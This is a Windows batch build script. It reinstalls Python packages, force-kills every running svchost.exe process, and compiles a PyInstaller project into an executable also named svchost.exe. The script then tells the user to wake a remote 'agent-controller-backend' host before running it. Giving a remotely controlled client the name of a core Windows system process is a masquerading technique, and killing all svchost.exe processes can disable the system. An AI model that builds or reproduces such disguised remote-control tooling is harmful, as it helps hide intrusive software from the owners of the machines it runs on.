@echo off
echo ===============================================
echo  Fixing corrupted packages and compiling
echo ===============================================
echo.

echo [1/6] Removing corrupted package folders...
powershell -Command "Remove-Item -Recurse -Force 'C:\Users\Brylle\AppData\Local\Programs\Python\Python313\Lib\site-packages\~*' -ErrorAction SilentlyContinue"
echo Done.

echo.
echo [2/6] Uninstalling potentially corrupted packages...
pip uninstall -y requests certifi urllib3 charset-normalizer idna 2>nul

echo.
echo [3/6] Installing all required packages from requirements-client.txt...
pip install --upgrade --pre -r requirements-client.txt

echo.
echo [4/6] Killing any running svchost.exe processes...
taskkill /F /IM svchost.exe 2>nul
if errorlevel 1 (
    echo No running instances found.
) else (
    echo Processes killed successfully.
)

echo.
echo [5/6] Cleaning old build files...
if exist build rmdir /s /q build
if exist dist rmdir /s /q dist
if exist *.spec~ del /q *.spec~

echo.
echo [6/6] Compiling with PyInstaller...
pyinstaller svchost.spec --clean --noconfirm

echo.
echo ===============================================
if exist dist\svchost.exe (
    echo  SUCCESS! svchost.exe is ready!
    echo ===============================================
    echo.
    echo Location: dist\svchost.exe
    echo.
    echo To test: cd dist ^& svchost.exe
    echo.
    echo To test connection first:
    echo 1. Wake your controller: https://agent-controller-backend.onrender.com
    echo 2. Wait 30-60 seconds
    echo 3. Run: cd dist ^& svchost.exe
    echo.
) else (
    echo  ERROR! Compilation failed!
    echo ===============================================
    echo Check the output above for errors.
)

pause
